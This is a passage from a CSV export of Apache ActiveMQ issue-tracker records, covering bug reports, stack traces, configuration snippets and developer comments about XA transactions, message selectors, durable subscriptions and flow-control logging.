",Ubuntu Linux,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74707,,,Thu Nov 01 14:50:11 UTC 2012,,,,,,,,,,,"0|i0dx1j:",79283,,,,,,,,,,,,,,,,,,,,,"01/Nov/12 14:50;tabish;Fixed on trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Rollback of unknown Xid gives unexpected XA errorCode: 0,AMQ-3255,12503028,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,guypardon,guypardon,31/Mar/11 15:30,23/Aug/11 19:34,14/Jul/23 05:43,23/Aug/11 19:34,5.3.0,,,,,,,,,,,,0,,,,,,,,,"XA transaction managers will/should do recovery of Xids that they have logged. In some cases, these Xids may have disappeared already in the JMS broker. Typical example scenario:

1. The TM starts a new Xid with XAResource.start(xid)
2. The app does some SQL in the xid context
3. The TM calls XAResource.end(xid)
4. The TM then logs the xid as ""to recover"" before it attempts the XA prepare
5. The broker crashes and prepare fails
6. The broker comes back up, recovers, and does rollback of the not yet prepared xid
7. The TM will also attempt recovery by calling rollback for the xid in question

In that case (step 7), the errorCode should not be 0 (as it is now in ActiveMQ) but rather one of the XA_RB* error codes to be conform the semantics of XA exceptions.
",Java on Mac OSX,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,64000,,,Tue Aug 23 19:34:04 UTC 2011,,,,,,,,,,,"0|i0rrrb:",160141,,,,,,,,,,,,,,,,,,,,,"16/Aug/11 19:53;tabish;I don't think this problem exists in the latest code, you might want to give the 5.5 release or a 5.6-SNAPSHOT build a try.;;;","23/Aug/11 19:34;tabish;Believe the code is correct now.  Not test cases given to verify.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 javax.jms.TransactionInProgressException: Cannot rollback() inside an XASession,AMQ-3251,12502721,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,cmoulliard,cmoulliard,29/Mar/11 14:10,20/Oct/11 04:40,14/Jul/23 05:43,29/Mar/11 14:18,5.4.2,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"The following error is generated when trying to configure ActiveMQ with JTA/XA
{code}
15:09:39,373 | WARN  | tenerContainer-1 | PooledSession                    | 47 - org.apache.activemq.activemq-pool - 5.4.2.fuse-03-09 | Caught exception trying rollback() when putting session back into the pool: javax.jms.TransactionInProgressException: Cannot rollback() inside an XASession
javax.jms.TransactionInProgressException: Cannot rollback() inside an XASession
	at org.apache.activemq.ActiveMQXASession.rollback(ActiveMQXASession.java:76)
	at org.apache.activemq.pool.PooledSession.close(PooledSession.java:111)
	at org.apache.activemq.pool.XaConnectionPool$Synchronization.afterCompletion(XaConnectionPool.java:90)
	at org.apache.geronimo.transaction.manager.TransactionImpl.afterCompletion(TransactionImpl.java:542)
	at org.apache.geronimo.transaction.manager.TransactionImpl.afterCompletion(TransactionImpl.java:535)
	at org.apache.geronimo.transaction.manager.TransactionImpl.commit(TransactionImpl.java:326)
	at org.apache.geronimo.transaction.manager.TransactionManagerImpl.commit(TransactionManagerImpl.java:250)
	at org.springframework.transaction.jta.JtaTransactionManager.doCommit(JtaTransactionManager.java:1009)
	at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:754)
	at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:723)
	at org.apache.aries.transaction.GeronimoPlatformTransactionManager.commit(GeronimoPlatformTransactionManager.java:76)
	at sun.reflect.GeneratedMethodAccessor519.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)[:1.6.0_24]
	at java.lang.reflect.Method.invoke(Method.java:597)[:1.6.0_24]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:309)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.osgi.service.importer.support.internal.aop.ServiceInvoker.doInvoke(ServiceInvoker.java:58)[71:org.springframework.osgi.core:1.2.0]
	at org.springframework.osgi.service.importer.support.internal.aop.ServiceInvoker.invoke(ServiceInvoker.java:62)[71:org.springframework.osgi.core:1.2.0]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.aop.support.DelegatingIntroductionInterceptor.doProceed(DelegatingIntroductionInterceptor.java:131)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.aop.support.DelegatingIntroductionInterceptor.invoke(DelegatingIntroductionInterceptor.java:119)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.osgi.service.util.internal.aop.ServiceTCCLInterceptor.invokeUnprivileged(ServiceTCCLInterceptor.java:56)[71:org.springframework.osgi.core:1.2.0]
	at org.springframework.osgi.service.util.internal.aop.ServiceTCCLInterceptor.invoke(ServiceTCCLInterceptor.java:39)[71:org.springframework.osgi.core:1.2.0]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.osgi.service.importer.support.LocalBundleContextAdvice.invoke(LocalBundleContextAdvice.java:59)[71:org.springframework.osgi.core:1.2.0]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.aop.support.DelegatingIntroductionInterceptor.doProceed(DelegatingIntroductionInterceptor.java:131)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.aop.support.DelegatingIntroductionInterceptor.invoke(DelegatingIntroductionInterceptor.java:119)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202)[60:org.springframework.aop:3.0.5.RELEASE]
	at $Proxy409.commit(Unknown Source)[:]
	at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveAndExecute(AbstractPollingMessageListenerContainer.java:257)[110:org.springframework.jms:3.0.5.RELEASE]
	at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1058)[110:org.springframework.jms:3.0.5.RELEASE]
	at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.executeOngoingLoop(DefaultMessageListenerContainer.java:1050)[110:org.springframework.jms:3.0.5.RELEASE]
	at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:947)[110:org.springframework.jms:3.0.5.RELEASE]
	at java.lang.Thread.run(Thread.java:680)[:1.6.0_24]
15:09:39,381 | WARN  | tenerContainer-1 | Transaction                      | 49 - org.apache.aries.transaction.manager - 0.2.0.incubating | Unexpected exception from afterCompletion; continuing
java.lang.RuntimeException: javax.jms.JMSException: Failed to invalidate session: org.apache.activemq.AlreadyClosedException: Cannot use The session has already been closed as it has already been closed
	at org.apache.activemq.pool.XaConnectionPool$Synchronization.afterCompletion(XaConnectionPool.java:93)
	at org.apache.geronimo.transaction.manager.TransactionImpl.afterCompletion(TransactionImpl.java:542)
	at org.apache.geronimo.transaction.manager.TransactionImpl.afterCompletion(TransactionImpl.java:535)
	at org.apache.geronimo.transaction.manager.TransactionImpl.commit(TransactionImpl.java:326)
	at org.apache.geronimo.transaction.manager.TransactionManagerImpl.commit(TransactionManagerImpl.java:250)
	at org.springframework.transaction.jta.JtaTransactionManager.doCommit(JtaTransactionManager.java:1009)
	at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:754)
	at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:723)
	at org.apache.aries.transaction.GeronimoPlatformTransactionManager.commit(GeronimoPlatformTransactionManager.java:76)
	at sun.reflect.GeneratedMethodAccessor519.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)[:1.6.0_24]
	at java.lang.reflect.Method.invoke(Method.java:597)[:1.6.0_24]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:309)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.osgi.service.importer.support.internal.aop.ServiceInvoker.doInvoke(ServiceInvoker.java:58)[71:org.springframework.osgi.core:1.2.0]
	at org.springframework.osgi.service.importer.support.internal.aop.ServiceInvoker.invoke(ServiceInvoker.java:62)[71:org.springframework.osgi.core:1.2.0]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.aop.support.DelegatingIntroductionInterceptor.doProceed(DelegatingIntroductionInterceptor.java:131)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.aop.support.DelegatingIntroductionInterceptor.invoke(DelegatingIntroductionInterceptor.java:119)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.osgi.service.util.internal.aop.ServiceTCCLInterceptor.invokeUnprivileged(ServiceTCCLInterceptor.java:56)[71:org.springframework.osgi.core:1.2.0]
	at org.springframework.osgi.service.util.internal.aop.ServiceTCCLInterceptor.invoke(ServiceTCCLInterceptor.java:39)[71:org.springframework.osgi.core:1.2.0]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.osgi.service.importer.support.LocalBundleContextAdvice.invoke(LocalBundleContextAdvice.java:59)[71:org.springframework.osgi.core:1.2.0]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.aop.support.DelegatingIntroductionInterceptor.doProceed(DelegatingIntroductionInterceptor.java:131)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.aop.support.DelegatingIntroductionInterceptor.invoke(DelegatingIntroductionInterceptor.java:119)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)[60:org.springframework.aop:3.0.5.RELEASE]
	at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202)[60:org.springframework.aop:3.0.5.RELEASE]
	at $Proxy409.commit(Unknown Source)[:]
	at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveAndExecute(AbstractPollingMessageListenerContainer.java:257)[110:org.springframework.jms:3.0.5.RELEASE]
	at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1058)[110:org.springframework.jms:3.0.5.RELEASE]
	at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.executeOngoingLoop(DefaultMessageListenerContainer.java:1050)[110:org.springframework.jms:3.0.5.RELEASE]
	at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:947)[110:org.springframework.jms:3.0.5.RELEASE]
	at java.lang.Thread.run(Thread.java:680)[:1.6.0_24]
Caused by: javax.jms.JMSException: Failed to invalidate session: org.apache.activemq.AlreadyClosedException: Cannot use The session has already been closed as it has already been closed
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:35)
	at org.apache.activemq.pool.SessionPool.invalidateSession(SessionPool.java:77)
	at org.apache.activemq.pool.PooledSession.close(PooledSession.java:123)
	at org.apache.activemq.pool.XaConnectionPool$Synchronization.afterCompletion(XaConnectionPool.java:90)
	... 33 more
Caused by: org.apache.activemq.AlreadyClosedException: Cannot use The session has already been closed as it has already been closed
	at org.apache.activemq.pool.PooledSession.getInternalSession(PooledSession.java:291)
	at org.apache.activemq.pool.SessionPool.destroyObject(SessionPool.java:90)
	at org.apache.commons.pool.impl.GenericObjectPool.invalidateObject(GenericObjectPool.java:1258)
	at org.apache.activemq.pool.SessionPool.invalidateSession(SessionPool.java:75)
{code}

Here is the config used to access to AMQ Broker

{code}
    <!-- Tx Manager -->
    <osgi:reference id=""txManager"" interface=""org.springframework.transaction.PlatformTransactionManager""/>

    <!-- Transaction POLICY used by Camel Transactional Route
         We refer to the ServiceMiX TxManager -->
    <bean id=""PROPAGATION_REQUIRED"" class=""org.apache.camel.spring.spi.SpringTransactionPolicy"">
       <property name=""transactionManager"" ref=""txManager""/>
    </bean>

    <bean id=""activemq"" class=""org.apache.activemq.camel.component.ActiveMQComponent"">
        <!-- <property name=""configuration"" ref=""jmsConfig""/> -->
        <property name=""connectionFactory"">
            <osgi:reference interface=""javax.jms.ConnectionFactory""/>
        </property>
        <property name=""transactionManager"" ref=""txManager""/>
        <property name=""transacted"" value=""true""/>
        <property name=""cacheLevel"" value=""0"" />
    </bean>

    <camelContext id=""camel"" xmlns=""http://camel.apache.org/schema/spring"">

        <route id=""queue-create-incident"">
            <from uri=""activemq:queue:incident""/>
            <transacted ref=""PROPAGATION_REQUIRED""/>
            <log message="">>> Incident received : ${body}""/>
            <bean ref=""processIncident"" method=""saveReport""/>
            <!-- <bean ref=""processIncident"" method=""generateError""/> -->
            <log message="">>> Record inserted : ${body}""/>
        </route>

2) ActiveMQ

    <bean id=""activemqConnectionFactory"" class=""org.apache.activemq.ActiveMQXAConnectionFactory"">
        <property name=""brokerURL"" value=""tcp://localhost:61616"" />
        <property name=""redeliveryPolicy"" ref=""redeliveryPolicy""/>
    </bean>

    <bean id=""pooledConnectionFactory"" class=""org.apache.activemq.pool.XaPooledConnectionFactory"">
        <property name=""maxConnections"" value=""8"" />
        <property name=""connectionFactory"" ref=""activemqConnectionFactory"" />
        <property name=""transactionManager"" ref=""transactionManager""/>
    </bean>

    <bean id=""redeliveryPolicy"" class=""org.apache.activemq.RedeliveryPolicy"">
        <property name=""maximumRedeliveries"" value=""0""/>
    </bean>

    <reference id=""transactionManager"" interface=""javax.transaction.TransactionManager"" />

    <service ref=""pooledConnectionFactory"" interface=""javax.jms.ConnectionFactory"">
        <service-properties>
            <entry key=""name"" value=""localhost""/>
        </service-properties>
    </service>
{code}",Fuse ESB - 4.3.1-01-09,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14606,,,Thu Oct 20 04:40:13 UTC 2011,,,,,,,,,,,"0|i0ajlz:",59450,,,,,,,,,,,,,,,,,,,,,"29/Mar/11 14:18;gtully;Committed r1086593
PooledSession is now xa aware such that it will not try a local rollback on close and can go back in the pool;;;","20/Oct/11 04:40;tranchida;Same issue but only when I add

<property name=""transacted"" value=""true""/>

setting only the transactionManager seems to work.

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SELECTORS doesn't work for releases 5.4.0 to current,AMQ-3245,12502617,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jayd.lowrider,jayd.lowrider,28/Mar/11 19:03,31/Mar/11 14:25,14/Jul/23 05:43,31/Mar/11 14:25,5.4.1,5.4.2,,,,,,,Selector,,,,0,,,,,,,,,"Is it possible that selector was broken due to new enhancement regarding REST selectors on 5.4.0? We are using 5.3.0 and selectors are working fine, however since we've upgraded our demo and test environments to 5.4.1 and essentially 5.4.2 it stop working for some reason. I can recreate it 100% of the time and below are the steps.

1) First create the producer with String property set to 30. i.e. test, 30:
{code}
String username=""Me""
String passwd = ""invicible""
String url =""failover:(tcp://localhost:51515)?maxReconnectDelay=5000&useExponentialBackOff=false"";
ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(username, passwd, url);
Connection connection = connectionFactory.createConnection();
// connection.setUseCompression(true); set this on the URL instead
connection.setExceptionListener(this);

String destinationString = ""Test.Dest"";
// create a session, destination, and producer
Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);
Destination destination = session.createQueue(destinationString);

MessageProducer producer = session.createProducer(destination);
producer.setDeliveryMode(DeliveryMode.PERSISTENT);

Message message = session.createTextMessage(""This is a test message"");
message.setIntProperty(""test"", 30);
// insert the message 1000 times.
for (long l = 0L; l < 1000; l++) {
      producer.send(message);
}
 producer.close();
 session.close();
 connection.close();
{code}

Now we have 1000 message sitting on activemq, if you navigate to http://localhost:8161/admin and view ""Test.Dest"" queue you should see the 1000 message there.

2) Create the consumer with test > 50 selector.
{code}
public void setup() {
String username=""Me""
String passwd = ""invicible""
String url =""failover:(tcp://localhost:51515)?maxReconnectDelay=5000&useExponentialBackOff=false""; //""tcp://localhost:51515"";
ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(username, passwd, url);
Connection connection = connectionFactory.createConnection();
// connection.setUseCompression(true); set this on the URL instead
connection.setExceptionListener(this);

// create a session, destination, and consumer
Session session = connection.createSession(false, Session.CLIENT_ACKNOWLEDGE);
String destinationString = ""Test.Dest"";
session.createQueue(destinationString);
MessageConsumer consumer = session.createConsumer(destination, ""test > 50"");
consumer.setMessageListener(this);

connection.start();

}


public void onMessage(Message message) {
       try {
            if (print && text) {
                TextMessage textMessage = (TextMessage) message;
                System.out.println(textMessage.getText());
            }

       catch (Exception ex)
       { //swallow } 
}

{code}

Once connected to broker, you'll see that it doesn't do anything as the message is not for this selector.

3) Edit the code to producer.
{code}
message.setIntProperty(""test"", 60);
{code}

And then rerun the producer to insert the 1000 records again.

Actual: Nothing happens, the consumer just waits for any message that comes in that matches the selector. 
Expected: The message gets consumed, as the latter part of the producer ran matches the selector.

This behavior works perfectly fine with 5.3.0. As selector is an important functionality of JMS as a whole this being broken is actually bad.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Mar/11 19:04;jayd.lowrider;ActiveMQ_Test_Case.txt;https://issues.apache.org/jira/secure/attachment/12474996/ActiveMQ_Test_Case.txt","30/Mar/11 19:04;jayd.lowrider;JmsTestConsumer1.java;https://issues.apache.org/jira/secure/attachment/12474998/JmsTestConsumer1.java","30/Mar/11 19:04;jayd.lowrider;JmsTestProducer1.java;https://issues.apache.org/jira/secure/attachment/12474997/JmsTestProducer1.java","30/Mar/11 19:04;jayd.lowrider;activemq.xml;https://issues.apache.org/jira/secure/attachment/12474995/activemq.xml",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74709,,,Thu Mar 31 14:25:36 UTC 2011,,,,,,,,,,,"0|i182xj:",255277,,,,,,,,,,,,,,,,,,,,,"28/Mar/11 19:15;tabish;You don't appear to be calling connection.start() in your consumer code.;;;","28/Mar/11 20:42;jayd.lowrider;I just missed that from the code.. Updating...;;;","28/Mar/11 21:55;gtully;Is this the maxPageSize limit issue? That was ignored in 5.3. Set it to 2000 via a destination policy.;;;","29/Mar/11 16:45;jayd.lowrider;I'll test the 2000 maxPageSize. But can anyone please explain what the PageSize mean? is it the number of queue or a page where it can contain number of queues? Thanks,;;;","29/Mar/11 17:24;gtully;it is documented at http://activemq.apache.org/per-destination-policies.html
Essentially it is the limit on the number of messages that will be held in memory for dispatch, so it becomes the effective window for selector matching.;;;","29/Mar/11 18:29;jayd.lowrider;Gary,
Thanks for your help.

Ok, I've tested with 2000 maxPageSize, and I see some issues with selector.It appears that a certain threshold where the selectors fail to apply its rules is at 30 messages and above. 

Just to be accurate, queues for the test below are 0. They don't contain any messages at all when I start the app. So when I run #2) the messages shows me 25 and then running #3) I get 50 total messages. Then I purge them so its clean and run the second set below with 30 messages.

If I run my test app in this sequence
1) Run consumer selector [test > 50] 
2) Run producer property [test, 20], insert 25 messages
3) Run producer property [test, 60], insert 25 messages

The selector works fine! Messages gets consumed.

Using same sequence as above but send 30 or more messages, nothing gets consumed.
1) Run consumer selector [test > 50] 
2) Run producer property [test, 20], insert 30 messages
3) Run producer property [test, 60], insert 30 messages

Is there other ways to get around this? This could particularly happen, a consumer for #2 get disconnected/crashed for some reason, and we are above the 30 threshold then nothing gets consumed at all.

Please advice.

Melvin
;;;","29/Mar/11 20:47;jayd.lowrider;Ok, making the maxPageSize to 5000, passes the 30 message threshold. So there is a correlation on the limit threshold and maxPageSize.;;;","30/Mar/11 10:56;dejanb;Hi,

I just tried to reproduce this and didn't manage.

I see the normal behavior until the number of messages in the queue reaches the page size, which was explained by Gary.

I noticed that in your code you use client ack and don't ack messages anywhere. Maybe this can explain what you see.

Can you create a test case that reproduces this and which includes your configuration as well.;;;","30/Mar/11 14:33;jayd.lowrider;Hello Dejan,

I've copied small chunks of my code, although I have the message.acknowledge() on my onMessage(Message message) method, however, this code is not called at all when the threshold is been reached. So it really doesn't matter. Anyway, I will attach my test class and broker configuration, and provide you the test/sequence that I did.

Melvin;;;","30/Mar/11 19:04;jayd.lowrider;Sample code, broker config and test case.;;;","30/Mar/11 19:07;jayd.lowrider;Hello Dejan,

I've attached my sample code and test case I did. If there is problem with our broker config, kindly let us know.

Regards,
Melvin;;;","31/Mar/11 10:39;dejanb;Hi,

your problem isn't related to page size but the small memory limit on the queue. Because of this small limit only portion of messages (22 to be precise) can be cached in the queue and while those messages aren't consumed others can't get in from the store.

So use some higher value for memory limit and you'd be fine.;;;","31/Mar/11 14:24;jayd.lowrider;Hi Dejan,

Ok, that made sense. We are not finding this information elsewhere, at least this is helpful understanding what is going on. From architecture point of view will haven an idea where we need to allocate memory and how to make activemq more reliable.

I would close this as fixed as the solution that Dejan mentioned works.

Thanks again everyone.

Melvin;;;","31/Mar/11 14:25;jayd.lowrider;Adding memory limits for queue solved the problem. This document will at least be the information on how selectors work with regards to destination policies.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Jboss blocked in startup when messages are in the que,AMQ-3239,12502176,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,mahmoudmaalej,mahmoudmaalej,23/Mar/11 13:10,02/Nov/13 20:55,14/Jul/23 05:43,02/Nov/13 20:55,5.4.2,,,,,5.9.0,,,Connector,,,,0,,,,,,,,,"Reproducing senario:
1- Start activemq server
2- With admin console send a message to testqueue (message is enqueued)
3- Deploy activemq-ra.rar connector
4- deploy an ear containing (an mdb to consume the message)  and a simple application
5- start jboss

Always Jboss startup block after INFO  [ra.ActiveMQEndpointWorker] Successfully established connection to broker [tcp://localhost:61616] and can't continue deployment of the ear which contain the mdb consumer

Is there a specific config to do, to let activemq-ra.rar deployed without trying to send the pending message untill the server starup and that the mdb beying ready to consume it. ","- Jboss 5.1.0 GA
- Activemq 5.4.2",davsclaus,mahmoudmaalej,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74711,,,Sat Nov 02 20:55:20 UTC 2013,,,,,,,,,,,"0|i0eanb:",81487,,,,,,,,,,,,,,,,,,,,,"02/Nov/13 20:55;davsclaus;The JCA RAR has been improved a lot in the 5.9 release and verified working in JBoss AS etc.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Topic-Messages not redelivered to durable subscription after rollback and reconnect,AMQ-3238,12502168,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,23/Mar/11 11:31,23/Mar/11 11:54,14/Jul/23 05:43,23/Mar/11 11:54,5.4.2,,,,,5.5.0,,,Broker,,,,0,durable,rollback,transactions,,,,,,"Durable sub acks ignore the transaction boundary, such that a rollback is ignored. The correct addition of rollback on close exposed this b/c transaction completion became an effective commit or the ack or receipt.  ",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14670,,,Wed Mar 23 11:54:16 UTC 2011,,,,,,,,,,,"0|i0ajnr:",59458,,,,,,,,,,,,,,,,,,,,,"23/Mar/11 11:54;gtully;http://svn.apache.org/viewvc?rev=1084550&view=rev

issue existed across all stores.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
warnOnProducerFlowControl is never reset to 'true' after the first INFO message is logged.,AMQ-3233,12502026,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,adrian.trenaman,adrian.trenaman,22/Mar/11 08:20,03/Mar/17 11:28,14/Jul/23 05:43,03/Mar/17 11:28,5.4.2,,,,,5.15.0,,,Broker,,,,0,,,,,,,,,"Looking at the code in Queue.java (around line 543), you can see that the warnOnProducerFlowControl variable is set to false when we log the INFO message ""Usage Manager Memory Limit (...) reached on ...."". However, it is never set to true again. So, if we consider operations users trawling through large logs over a period of time, the may see the first warning on Monday, but then see no further warnings of this behavior for the rest of the week. Surely we should be resetting the warnOnProducerFlowControl variable to true, so that subsequent flow control situations are correctly logged?",All,adrian.trenaman,gtully,jira-bot,tmielke,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-6614,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74713,,,Fri Mar 03 11:28:10 UTC 2017,,,,,,,,,,,"0|i0eanr:",81489,,,,,,,,,,,,,,,,,,,,,"03/Mar/17 11:23;jira-bot;Commit 01b1f7f6945ba0897732b9eaae2ee1c9d50faf07 in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=01b1f7f ]

[AMQ-3233] respect policy entry blockedProducerWarningInterval for flow control warning, 0 disables and Xmillis makes it periodic, default period of 30s is not unlike the existing once behaviour. fix and tests
;;;","03/Mar/17 11:28;gtully;strange that this was out there for so long!
in any event, the policy entry blockedProducerWarningInterval needed to be respected such that the logging rate can be regulated. The default value of 30s   means the behaviour is not unlike a single shot as it is now but in the case of long term blocking the warning will repeat as new producers are blocked.

